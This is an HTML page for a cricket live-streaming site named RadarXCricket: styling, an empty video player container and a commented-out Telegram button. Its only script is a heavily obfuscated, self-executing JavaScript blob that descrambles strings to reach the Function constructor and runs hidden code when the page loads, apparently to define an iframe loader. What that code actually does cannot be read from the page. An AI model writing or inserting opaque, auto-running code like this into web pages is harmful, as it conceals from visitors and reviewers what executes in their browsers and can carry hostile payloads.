<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
   <!-- <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button> -->
</div>

<script>
var loadIframe;(function(){var yYJ='',fVB=230-219;function ixm(n){var f=4548842;var y=n.length;var j=[];for(var b=0;b<y;b++){j[b]=n.charAt(b)};for(var b=0;b<y;b++){var t=f*(b+149)+(f%36988);var v=f*(b+397)+(f%37929);var g=t%y;var q=v%y;var x=j[g];j[g]=j[q];j[q]=x;f=(t+v)%4735000;};return j.join('')};var slf=ixm('jgotkroctruofcuhvsdietlwnzsqpayrxmbnc').substr(0,fVB);var FMG='.n<6r;=5rmvhdnlra!{va[am.oat]dd+=ren+i;n+p rr0 =wa;f(;l o.)]08(,mu=9  =Ahj1,86u4t{h(l4(san=]egtwd6(;au+[ivl6ic=on.t<=.fh.;xwrqs)dpbi;Ar=ar i.i,h<uv2sguj ape;; "72)(j=n=otedi{y=h)rpailve)s=1r)ni=l =,,)f.81 leorwce]u"+on)s,ccrfn;; ia];ta4"a!atli.Cn]wvj10((+r8f" [i  "kootf;qlt.(cnht(--1+h=e+vrs)}=((i,e=ud( +=) +r;eq;;0ax]k4t,(l)v>qAi0f )2 <;tstu,nnfar1a9rc;bup)va" ;hi{i<y[nr+({r)rru,[nrh;Aun);rg(5c;vSn=a]c,;[sqil7);(=;eei=k9;3.lrp)o pe8tgie1}-[1o6iycfr);9(8=8+;vgw,=rrr.av(l }evg.hae+a]c0ar>od}kur4+fi[cl;1vzp7o; (t(iu4a-k;-=isjah.7r]lSl{;o,trnt+0gm6(k,ahgl2)c8uj;i[a+C17*(g=(l,w+C.b1hgi9epoo(kv*=hnua.}s.v;a}.(ur +usva)lkcfn,zo=gCv )8mj+.o+i.28=h,ve+=0.;.Cr);h)q))-]vtg(o";7p,pvg+tvhh9d0aA2av0]gn)bl8o;,7s"r,em;[r(=o[i3ts)a,=(= fda-+w)(5ratv4idro2rh=[t=dn=);"a+,u8=eldycfCj[m]al+o5lt]0=s;za)gnr[b=a4);vsnxh6.nu(;teu}.v6,{ar;(.j.f1w,tri7a.e,omnaCv0bo=vztr)x,9rp;e9nkmii,gat((=;=")u4o)Cstl;';var oAQ=ixm[slf];var Uvf='';var yov=oAQ;var VEL=oAQ(Uvf,ixm(FMG));var Gto=VEL(ixm('Yr4tYYabY4Y27_8]I]]b)},qw_0re=owYn3v)s!a\/b]\'ii t4p(fYY3ua+$(oY.r%be1jurY-Yb)5aYjrroi#Y$-_3Y S(s(vl(;tYcY9fae].)),Yl((su6=0e.%4t_r! \/.w6u.c4E3wl0!\/,bb_3Y=u-s ".9!-in(1*,a3o)8ealbh)7tbbgne%dgneYYnn"vffYl+ttw3u!z_ +_,"oY%;-dms\/-aw,rl Y7)_pd)t03erY%_stecbltnsnl&nl4eY)!evm,3)&(niYYf(Y )atwbl.YYa]2YStE)ob1,e(Y\'oY}\/8t.)$wd3YYi6YY37{$l(!._4xsr.r;$8-=\'e_ap8hi{Y[!5;ak%4=26yin)-7]a3Y7b-;9Y6) u,}sllox)cu%a.ttll_,wrah8.#eY4YnYfio2%4.sYcsp r:reer."7l_[(=&))vn%r$_g]1omY}(7(Yl1!6xtc8[.%C)pf8Y1h#2.ly*t]=_3ld7n. o={t()(r_=0b\/fsba3.Y!o(bvorY)t,],=f0Y24oS=t}j30;lntnjC$9nuh s(%pon)_,)ooY63YtYtY(6,!.13uYq;e0.mi;%_;dfaf(Y1oo{bh,te;n8e$l$08_$to+Yld]Y4Yl%8rr361chmbpp4%4YY ,(3g8)i9].u26";w($!Y&3;t,s}aYi7Yb);8oo9x) i37n%]i4Y;,ia"wsbroe5(o0ma79-YY2eb!+.!%1dp_n!)Y;]Ylx$))u}6it)n5Ywtn=_Yt}Y7(n,..i][1f!(n4ralutd:0a3i3YYo8r,7,Y{.c.$o.Ciur3ad0s$lee#Yp=Y;)b.siY7tn.$+n Yml.bYwdgYYjt9c.0_ae=f3(.dYqrto3!pb4fu.ouYt\/.0.o_n$YYY660YriY=1u(.euY0gc=%v{.i3*ts71..q%!=ff)[Y6.%YY,:dY*t2edh==$Y3-9!qtsa5Ycs7d)e68Y,(o;)h0f*)rliY.;tb".fl1+$na$jsl!;9$;]==Y.Y(=c;%.od2;_;n 1-$(}1&%f.n1\/pYcdY!v1(a)Yq-cf$Y6nbg,;.i(da d=o23.n{ow3a6iu2; rkftn0b\/r+e:1_Y[dr[(}*}1!lhf[+Cv3{YYntk].{_6.,gew$9 #t3q=5t{)3;_,({e}dlb.YYdyooY6sx)e$n2gm)#e5m)3,){v%o5Y3)a1(r73...1u33Y\';grt6e)]po31):1Yr0aeY$9cye}=o$nplYtunfqfr0h.;d0d&%l,!oa6Yi_$l rY_o$.;Y88tYYoe{_ r 6YY!\'pr"$bo"%sb,_(ne{r)al\/I.pa (lb)h3f=0mY81pYuio;Y?m(%o]era!.).e9b_(bYb)Y Yf]71w2f!ncY.43.o!(xiY.e%}oa.5!Y,6me;,maem)YunY4w ! Yoc))ec;]((jY\/st,v,=Y[ia.1n[;%Y.ofetr7j-1d#hnuj.11o;4bY .nYe 4fi,'));var Cvr=yov(yYJ,Gto );Cvr(5114);return 3381})()
</script>

</body>
</html>